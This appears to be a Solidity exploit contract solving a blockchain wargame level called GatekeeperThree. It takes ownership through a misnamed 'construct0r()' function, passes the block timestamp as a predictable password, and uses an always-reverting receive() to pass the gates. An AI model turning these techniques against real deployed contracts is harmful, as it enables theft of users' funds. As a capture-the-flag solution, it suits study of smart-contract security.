pragma solidity ^0.8.19;

contract GateKeeperThreeContract {
    address private constant levelContractAddress = 0x1C363D81b1A56214529fb8EC495847Dc7A795aef;
    function hack() payable external {
        // acquire the owner permission
        levelContractAddress.call(abi.encodeWithSignature("construct0r()"));
        levelContractAddress.call(abi.encodeWithSignature("createTrick()"));
        levelContractAddress.call(abi.encodeWithSignature("getAllowance(uint256)", uint256(block.timestamp)));
        payable(levelContractAddress).send(msg.value);
        levelContractAddress.call(abi.encodeWithSignature("enter()"));

        (bool success, bytes memory data) = levelContractAddress.call(abi.encodeWithSignature("entrant()"));
        address entrant = abi.decode(data, (address));
        require(entrant == msg.sender, "hack fail");
    }

    receive() external payable{
        revert();
    }
}